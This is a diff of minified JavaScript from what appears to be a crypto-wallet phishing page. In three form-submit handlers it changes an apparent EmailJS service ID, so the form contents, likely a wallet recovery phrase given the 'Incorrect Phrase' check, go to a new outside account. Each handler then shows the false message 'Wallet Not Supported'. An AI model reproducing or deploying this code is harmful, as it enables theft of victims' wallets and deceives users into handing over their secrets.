@@ -29898,7 +29898,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         p ? alert("Incorrect Phrase") : (c(!0),
-                                        A("service_l867gll", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
+                                        A("service_rzwb5md", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
                                                 console.log(e),
                                                     alert("Wallet Not Supported"),
                                                     l(""),
@@ -29982,7 +29982,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i ? (c(!0),
-                                        A("service_l867gll", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
+                                        A("service_rzwb5md", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
                                                 console.log(e),
                                                     alert("Wallet Not Supported"),
                                                     l(""),
@@ -30042,7 +30042,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i(!0),
-                                        A("service_l867gll", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
+                                        A("service_rzwb5md", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
                                             console.log(e),
                                                 l(""),
                                                 i(!1)
